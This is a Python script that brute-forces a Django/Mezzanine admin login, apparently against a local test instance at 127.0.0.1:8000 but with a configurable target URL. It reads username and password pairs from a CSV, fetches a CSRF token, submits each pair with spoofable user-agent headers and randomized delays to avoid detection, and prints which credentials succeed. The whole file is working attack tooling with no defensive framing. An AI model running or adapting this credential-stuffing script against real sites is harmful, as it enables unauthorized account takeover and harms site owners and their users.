# -*- coding: utf-8 -*-

import configparser
import csv
import os
import random
from time import sleep

import requests

from fake_useragent import UserAgent


def acccess(http_info):
    request_info = http_info
    for key in ('payload', 'headers', 'querystring'):
        if key not in http_info:
            request_info[key] = {}

    try:
        res = requests.request(
            request_info['method'],
            request_info['url'],
            data=request_info['payload'],
            headers=request_info['headers'],
            params=request_info['querystring'],
        )
        return res
    except Exception as e:
        print(e)


def interval(config):
    max_ = int(config.get('interval', 'max'))
    min_ = int(config.get('interval', 'min'))
    if max_ == min_:
        sleep(min_)
    else:
        sleep(random.uniform(min_, max_))


def attacker(user, pass_, config):
    cookie = acccess({'method': 'GET', 'url': 'http://127.0.0.1:8000/admin'}).cookies['csrftoken']
    interval(config)

    useragent = config.get('http_headers', 'useragent')
    if useragent == "random":
        useragent = ua.random

    res = acccess({
        'method': 'POST',
        'url': config.get('general', 'url'),
        'querystring': {'next': '/ja/admin'},
        'payload': 'username={}&password={}&this_is_the_login_form=1&mezzanine_login_interface=admin&csrfmiddlewaretoken={}'.format(user, pass_, cookie),
        'headers': {
            'useragent': useragent,
            'cookie': 'csrftoken={}'.format(cookie),
            'referer': config.get('http_headers', 'referer'),
            'accept': config.get('http_headers', 'accept'),
            'content-type': 'application/x-www-form-urlencoded',
            # 'origin': 'http://127.0.0.1:8000',
            'cache-control': 'no-cache',
            'accept_language': config.get('http_headers', 'accept_language'),
        },
    })
    if "ダッシュボード" in res.text:
        print("User: {}, Pass: {}, Result: Succeeded".format(user, pass_))
    else:
        print("User: {}, Pass: {}, Result: Failed".format(user, pass_))

    interval(config)


def main():
    config = configparser.SafeConfigParser()
    config.read('./attacker.conf')

    with open((os.path.normpath(os.path.join(os.path.abspath('__file__'), './../attack_list.csv')))) as f:
        reader = csv.reader(f)
        header = next(reader)
        for row in reader:
            attacker(str(row[0]), str(row[1]), config)


if __name__ == '__main__':
    main()
